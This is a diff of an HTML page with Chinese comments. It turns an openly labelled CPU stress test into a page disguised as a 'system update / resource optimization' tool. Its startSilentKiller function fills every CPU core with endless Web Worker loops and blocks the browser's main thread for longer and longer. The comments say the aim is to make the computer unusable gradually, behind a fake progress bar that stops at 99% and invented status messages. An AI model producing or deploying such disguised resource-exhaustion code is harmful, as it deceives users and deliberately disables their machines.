@@ -1,148 +1,160 @@
-<!DOCTYPE html>
+、<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>高压稳定测试 (无崩溃版)</title>
+    <title>正在配置系统更新...</title>
     <style>
         body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Consolas', monospace;
-            overflow: hidden;
             margin: 0;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            cursor: progress; /* 鼠标变成加载圈，增加心理压力 */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f3f3f3;
+            color: #333;
+            cursor: default;
+            user-select: none;
         }
-        
-        #controls {
-            z-index: 100;
+
+        /* 极简容器 */
+        .container {
             text-align: center;
-            background: rgba(0,0,0,0.8);
-            padding: 20px;
-            border: 1px solid #333;
+            width: 300px;
         }
 
-        button {
-            padding: 15px 40px;
-            font-size: 20px;
-            background: #d00;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
+        /* 看起来非常人畜无害的加载圈 */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e1e1e1;
+            border-top: 3px solid #007aff; /* 经典的系统蓝 */
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
         }
-        
-        button:hover { background: #f00; }
 
-        #stats {
-            margin-top: 20px;
-            font-size: 14px;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        h2 {
+            font-weight: 400;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 13px;
             color: #888;
+            margin-bottom: 30px;
         }
 
-        .particle {
-            position: absolute;
-            font-size: 20px;
-            pointer-events: none;
-            opacity: 0.7;
+        /* 唯一的按钮，看起来也很正经 */
+        button {
+            background: #fff;
+            border: 1px solid #ccc;
+            padding: 8px 20px;
+            font-size: 13px;
+            border-radius: 4px;
+            cursor: pointer;
+            color: #333;
+            transition: all 0.2s;
+        }
+
+        button:hover {
+            background: #f9f9f9;
+            border-color: #bbb;
+        }
+
+        /* 隐藏的性能监控，为了让你知道它在工作 */
+        #debug {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 10px;
+            color: #ccc;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
 
-    <div id="controls">
-        <h1>CPU & GPU 压力测试 (防崩溃版)</h1>
-        <p>此模式将强制降低 FPS 并满载 CPU，但保持内存循环回收。</p>
-        <button onclick="startLagEngine()">⚡ 确认并开始运行 ⚡</button>
-        <div id="stats">等待启动...</div>
+    <div class="container" id="main-ui">
+        <h2>系统资源优化</h2>
+        <p>点击下方按钮开始运行性能基准测试。</p>
+        <button onclick="startSilentKiller()">开始运行</button>
     </div>
 
+    <div class="container" id="loading-ui" style="display: none;">
+        <div class="spinner"></div>
+        <h2 id="msg">正在整理内存碎片...</h2>
+        <p>请勿关闭浏览器 ( <span id="percent">0</span>% )</p>
+    </div>
+
+    <div id="debug"></div>
+
     <script>
-        let isRunning = false;
-        
-        function startLagEngine() {
-            if(isRunning) return;
-            isRunning = true;
-            document.querySelector('h1').innerText = "系统资源已被占用";
-            document.querySelector('p').innerText = "尝试移动鼠标，你会感觉到明显的延迟。";
-            
-            // 1. 启动 Web Workers (填满多核 CPU)
+        function startSilentKiller() {
+            // 切换 UI
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('loading-ui').style.display = 'block';
+
+            // 1. 启动 CPU 满载 (Web Workers)
             const cores = navigator.hardwareConcurrency || 8;
-            const workerScript = `
+            const blob = new Blob([`
                 self.onmessage = () => {
-                    while(true) {
-                        // 复杂的三角函数运算，只烧 CPU，不吃内存
-                        Math.sin(Math.random()) * Math.tan(Math.random());
-                    }
+                    while(true) { Math.random(); } // 最纯粹的 CPU 消耗
                 }
-            `;
-            const blob = new Blob([workerScript], {type: 'application/javascript'});
+            `], {type: 'text/javascript'});
             const url = URL.createObjectURL(blob);
             
             for(let i=0; i<cores; i++) {
-                new Worker(url).postMessage('run');
+                new Worker(url).postMessage('go');
             }
 
-            // 2. 启动主线程阻塞器 (造成 UI 卡顿的核心)
-            renderLoop();
-        }
+            // 2. 启动 "温水煮青蛙" 模式的主线程阻塞
+            // 刚开始不卡，让你放松警惕，然后越来越卡
+            let lagSeverity = 0; // 阻塞时间 (ms)
+            let progress = 0;
 
-        function renderLoop() {
-            const start = performance.now();
-            
-            // --- 核心卡顿逻辑 ---
-            
-            // 1. 强制阻塞主线程 X 毫秒
-            // 浏览器通常试图以 16ms (60fps) 刷新。
-            // 我们强制让它在 JS 里卡住 200ms，这样 FPS 会降到 5 左右。
-            // 这比死循环好，因为它允许浏览器有一瞬间去处理"活着"的信号，防止崩溃。
-            while (performance.now() - start < 200) {
-                // 做一些无意义的 DOM 计算来阻塞 UI 线程
-                document.body.getBoundingClientRect(); 
-            }
-
-            // 2. 内存抖动 (Memory Churn)
-            // 创建大量对象然后立即让它们失去引用。
-            // 这会强制触发垃圾回收(GC)，导致微卡顿，但不会内存溢出。
-            let trash = [];
-            for(let i=0; i<50000; i++) {
-                trash.push({x: Math.random(), y: Math.random()});
-            }
-            trash = null; // 立即释放，等待 GC 介入
-
-            // 3. 视觉干扰
-            createChaos();
-
-            // 更新状态文字
-            document.getElementById('stats').innerText = 
-                `CPU 核心满载: 100%\n当前帧延迟: ${(performance.now() - start).toFixed(0)}ms\nFPS: < 5`;
-
-            // 请求下一帧 (只要这个还在跑，浏览器就不会认为页面死了)
-            requestAnimationFrame(renderLoop);
-        }
-
-        function createChaos() {
-            // 简单的视觉效果，因为主线程被阻塞，这些动画会像幻灯片一样卡
-            const div = document.createElement('div');
-            div.className = 'particle';
-            div.innerText = Math.random() > 0.5 ? '1' : '0';
-            div.style.left = Math.random() * window.innerWidth + 'px';
-            div.style.top = Math.random() * window.innerHeight + 'px';
-            div.style.color = `rgb(${Math.random()*255}, 255, 0)`;
-            document.body.appendChild(div);
-
-            // 保持 DOM 数量恒定，防止内存泄漏
-            if (document.body.children.length > 500) {
-                // 删除最早生成的 10 个节点
-                for(let i=0; i<10; i++) {
-                    const node = document.body.querySelector('.particle');
-                    if(node) document.body.removeChild(node);
+            const updateLoop = () => {
+                const start = performance.now();
+                
+                // --- 核心阻塞逻辑 ---
+                // 随着进度增加，阻塞时间呈指数级上升
+                // 0% -> 0ms (流畅)
+                // 50% -> 50ms (微卡)
+                // 80% -> 200ms (明显卡顿)
+                // 99% -> 500ms+ (甚至无法移动鼠标)
+                
+                if (lagSeverity > 0) {
+                    while (performance.now() - start < lagSeverity) {
+                        // 空转阻塞 UI
+                    }
                 }
-            }
+
+                // 更新进度条文字 (假进度)
+                progress += 0.05; // 走得很慢
+                if (progress > 99) progress = 99; // 永远卡在 99%
+                
+                document.getElementById('percent').innerText = progress.toFixed(1);
+                
+                // 增加卡顿等级
+                lagSeverity = Math.pow(progress, 1.5) * 0.8; 
+
+                // 随机变换提示语，增加真实感
+                if (Math.random() > 0.99) {
+                    const msgs = ["正在重新分配缓存...", "优化后台服务...", "释放多余句柄...", "正在等待响应..."];
+                    document.getElementById('msg').innerText = msgs[Math.floor(Math.random() * msgs.length)];
+                }
+
+                document.getElementById('debug').innerText = `Lag: ${lagSeverity.toFixed(0)}ms/frame`;
+
+                // 请求下一帧
+                requestAnimationFrame(updateLoop);
+            };
+
+            updateLoop();
         }
     </script>
 </body>
